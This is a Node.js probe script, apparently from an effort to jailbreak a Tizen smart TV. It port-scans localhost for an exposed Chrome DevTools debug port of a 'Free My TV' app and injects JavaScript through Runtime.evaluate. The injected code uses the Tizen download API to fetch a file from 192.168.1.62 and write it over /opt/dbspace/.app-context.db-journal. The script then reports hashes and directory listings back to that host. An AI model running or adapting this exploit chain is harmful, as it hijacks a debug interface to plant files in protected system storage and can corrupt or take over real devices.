"use strict";
/* p23: self-contained CDP (raw WS, only builtins) — scan for Free My TV debug port, deliver journal via Download API */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var http = require('http');
var crypto = require('crypto');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p23', results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }
function run(cmd, timeout){
  try { return cp.execSync(cmd, {timeout:timeout||30000, maxBuffer:16*1024*1024}).toString().trim(); }
  catch(e){ var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();
    return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
var JURL = 'http://192.168.1.62:9999/appctx_hot_journal';
var JDEST = '/opt/dbspace/.app-context.db-journal';

// ---------- minimal WebSocket client (client->server masked) ----------
function wsFrameText(str){
  var payload = Buffer.from(str, 'utf8');
  var len = payload.length;
  var mask = crypto.randomBytes(4);
  var header;
  var lenBytes;
  if (len < 126) { lenBytes = Buffer.from([0x80 | len]); }
  else if (len < 65536) { lenBytes = Buffer.concat([Buffer.from([0x80|126]), Buffer.from([ (len>>8)&0xff, len&0xff ])]); }
  else { lenBytes = Buffer.concat([Buffer.from([0x80|127]), Buffer.from([0,0,0,0]), Buffer.from([ (len>>>24)&0xff,(len>>>16)&0xff,(len>>>8)&0xff, len&0xff ])]); }
  var masked = Buffer.alloc(len);
  for (var i=0;i<len;i++){ masked[i] = payload[i] ^ mask[i % 4]; }
  return Buffer.concat([Buffer.from([0x81]), lenBytes, mask, masked]);
}
function parseFrames(buf, handlers){
  var pos = 0;
  while (true) {
    if (buf.length - pos < 2) return buf.slice(pos); // need more
    var b0 = buf[pos], b1 = buf[pos+1];
    var opcode = b0 & 0x0f;
    var masked = (b1 & 0x80) !== 0;
    var len = b1 & 0x7f;
    var p = pos + 2;
    if (len === 126) { if (buf.length-p < 2) return buf.slice(pos); len = buf.readUInt16BE(p); p += 2; }
    else if (len === 127) { if (buf.length-p < 8) return buf.slice(pos); len = Number(buf.readUInt32BE(p+4)); p += 8; }
    var maskKey = null;
    if (masked) { if (buf.length-p < 4) return buf.slice(pos); maskKey = buf.slice(p, p+4); p += 4; }
    if (buf.length - p < len) return buf.slice(pos); // need more
    var payload = buf.slice(p, p+len);
    if (masked) { var m = Buffer.alloc(len); for (var i=0;i<len;i++){ m[i] = payload[i] ^ maskKey[i%4]; } payload = m; }
    p += len;
    if (opcode === 0x8) { handlers.onClose && handlers.onClose('server close'); }
    else if (opcode === 0x9) { handlers.onPing && handlers.onPing(); }
    else if (opcode === 0x1 || opcode === 0x2) { handlers.onMessage && handlers.onMessage(payload.toString('utf8')); }
    pos = p;
    if (pos >= buf.length) return Buffer.alloc(0);
  }
}
function WSClient(port, path, handlers){
  var socket = net.connect(port, '127.0.0.1');
  var buf = Buffer.alloc(0);
  var upgraded = false;
  var pending = [];
  socket.setTimeout(15000);
  socket.on('connect', function(){
    var key = crypto.randomBytes(16).toString('base64');
    var req = 'GET ' + path + ' HTTP/1.1\r\n' +
      'Host: 127.0.0.1:' + port + '\r\n' +
      'Upgrade: websocket\r\n' +
      'Connection: Upgrade\r\n' +
      'Sec-WebSocket-Key: ' + key + '\r\n' +
      'Sec-WebSocket-Version: 13\r\n' +
      '\r\n';
    socket.write(req);
  });
  socket.on('data', function(chunk){
    buf = Buffer.concat([buf, chunk]);
    if (!upgraded) {
      var idx = buf.indexOf('\r\n\r\n');
      if (idx >= 0) {
        var header = buf.slice(0, idx).toString();
        if (header.indexOf('101') >= 0) {
          upgraded = true;
          buf = buf.slice(idx + 4);
          pending.forEach(function(f){ socket.write(f); });
          pending = [];
        } else {
          handlers.onError && handlers.onError('WS upgrade failed: ' + header.substring(0,200));
          socket.destroy();
        }
      }
      return;
    }
    try { buf = parseFrames(buf, { onMessage: handlers.onMessage, onClose: handlers.onClose, onPing: function(){ /* ignore */ } }); }
    catch(e){ handlers.onError && handlers.onError('parse: '+e); }
  });
  socket.on('error', function(e){ handlers.onError && handlers.onError(String(e)); });
  socket.on('timeout', function(){ socket.destroy(); });
  socket.on('close', function(){ handlers.onClose && handlers.onClose('socket close'); });
  return {
    send: function(str){ var f = wsFrameText(str); if (!upgraded) pending.push(f); else socket.write(f); },
    close: function(){ socket.destroy(); }
  };
}

// ---------- CDP ----------
var idc = 0;
function cdpCall(ws, method, params, cb){
  var id = ++idc;
  var pendingCb = cb;
  var myid = id;
  var onMsg = function(text){
    try {
      var msg = JSON.parse(text);
      if (msg.id === myid) {
        ws._onmsg = null; // detach
        cb(null, msg);
      } else if (ws._dispatch) {
        ws._dispatch(msg);
      }
    } catch(e){}
  };
  ws._onmsg = onMsg;
  // wrap: route incoming to onmsg or dispatch
  ws._route = onMsg;
  ws.send(JSON.stringify({ id: id, method: method, params: params || {} }));
}

// ---------- port scan for CDP ----------
function probePort(port, cb){
  var req = http.get({ host:'127.0.0.1', port: port, path:'/json', timeout: 1500 }, function(res){
    var data = '';
    res.on('data', function(c){ data += c; });
    res.on('end', function(){
      try {
        var j = JSON.parse(data);
        if (Array.isArray(j)) { cb(port, j, null); }
        else { cb(port, j, null); }
      } catch(e){ cb(port, null, 'notjson:'+data.substring(0,80)); }
    });
  });
  req.on('error', function(e){ cb(port, null, 'connerr'); });
  req.on('timeout', function(){ req.abort(); cb(port, null, 'timeout'); });
}

function finish(){ R.results.final='done '+new Date().toISOString(); postRaw('/p23info', JSON.stringify(R)); L('p23 done'); }

// baseline
R.results.live_before = run('md5sum /opt/dbspace/.app-context.db 2>&1', 10000);
R.results.journal_before = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);

// port scan: batched
var ranges = [];
for (var p=8000; p<12000; p++) ranges.push(p);
for (var q=20000; q<20500; q++) ranges.push(q);
R.results.scan_range = '8000-11999,20000-20499 ('+ranges.length+' ports)';
var foundPorts = [];
var idx = 0;
var CONC = 200;
var finished = 0;
function scanNext(){
  if (idx >= ranges.length) {
    R.results.cdp_ports_found = foundPorts;
    if (foundPorts.length > 0) { connectToFirst(foundPorts[0]); }
    else { R.results.note = 'no CDP port found in range'; finish(); }
    return;
  }
  var batch = ranges.slice(idx, idx + CONC);
  idx += CONC;
  var done = 0;
  batch.forEach(function(port){
    probePort(port, function(port, json, err){
      if (json) {
        foundPorts.push({ port: port, json: String(json).substring(0, 800) });
        L('CDP port found: ' + port);
      }
      done++;
      if (done >= batch.length) scanNext();
    });
  });
}

function connectToFirst(found){
  var port = found.port;
  var targets;
  try { targets = JSON.parse(found.json); } catch(e){ targets = null; }
  var wsUrl = null, title = '';
  if (targets && Array.isArray(targets)) {
    for (var i=0;i<targets.length;i++){
      var t = targets[i];
      if (t.webSocketDebuggerUrl) { wsUrl = t.webSocketDebuggerUrl; title = t.title||t.url||''; break; }
    }
  } else if (targets && targets.webSocketDebuggerUrl) {
    wsUrl = targets.webSocketDebuggerUrl; title = 'single';
  }
  R.results.chosen_port = port;
  R.results.chosen_target = String(title).substring(0,300);
  if (!wsUrl) { R.results.note='CDP port found but no webSocketDebuggerUrl'; finish(); return; }
  // wsUrl like ws://127.0.0.1:PORT/devtools/page/ID  -> path
  var m = wsUrl.match(/^ws:\/\/[^\/]+(\/.*)$/);
  if (!m) { R.results.note='bad wsUrl '+wsUrl; finish(); return; }
  var wsPath = m[1];
  var evaluated = false;
  var ws = WSClient(port, wsPath, {
    onMessage: function(text){
      // route CDP responses
      try {
        var msg = JSON.parse(text);
        if (msg.id === 100) { /* enable done */ }
        if (msg.id === 101) {
          R.results.eval_setup = JSON.stringify(msg.result ? (msg.result.result ? msg.result.result.value : msg.result) : msg).substring(0,800);
          // schedule readback
          setTimeout(function(){
            ws.send(JSON.stringify({ id:102, method:'Runtime.evaluate', params:{ expression:'JSON.stringify(window.__dl)', returnByValue:true } }));
          }, 20000);
        }
        if (msg.id === 102) {
          R.results.eval_readback = JSON.stringify(msg.result ? (msg.result.result ? msg.result.result.value : msg.result) : msg).substring(0,800);
          R.results.journal_after = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);
          R.results.dbspace_after = run('ls -la /opt/dbspace/ 2>&1 | grep -iE "app-context" | head -20', 10000);
          ws.close();
          finish();
        }
      } catch(e){ R.results.cdp_parse_err = String(e); }
    },
    onClose: function(why){ if (!evaluated) { R.results.ws_close = why; } },
    onError: function(e){ R.results.ws_error = String(e); }
  });
  // send Runtime.enable then evaluate
  setTimeout(function(){
    ws.send(JSON.stringify({ id:100, method:'Runtime.enable', params:{} }));
  }, 500);
  var setupJS = '(function(){ window.__dl={start:Date.now(),tizen:typeof tizen,dl:(typeof tizen!=="undefined")?typeof tizen.download:"none",status:"pending",progress:"",err:"",done:""}; try{ tizen.download.download('+JSON.stringify(JURL)+', '+JSON.stringify(JDEST)+', function(d,t){window.__dl.progress=d+"/"+t;}, function(e){window.__dl.err=String(e&&e.message||e);window.__dl.status="error";}, function(d,t){window.__dl.done=d+"/"+t;window.__dl.status="complete";}); window.__dl.status="started"; }catch(e){window.__dl.err=String(e);window.__dl.status="exception";} return JSON.stringify(window.__dl); })()';
  setTimeout(function(){
    ws.send(JSON.stringify({ id:101, method:'Runtime.evaluate', params:{ expression: setupJS, returnByValue:true } }));
  }, 1500);
}

scanNext();
